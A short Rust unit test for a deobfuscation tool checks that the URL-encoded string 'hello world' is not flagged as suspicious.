    fn test_decode_url_hello_world_not_suspicious() {
        let deob = Deobfuscator::new();
        // URL encoded but non-suspicious content
        let content = "%68%65%6c%6c%6f%20%77%6f%72%6c%64"; // "hello world"
        let results = deob.decode_url(content);
        // Should not return results since content is not suspicious
        assert!(results.is_empty());
    }
}
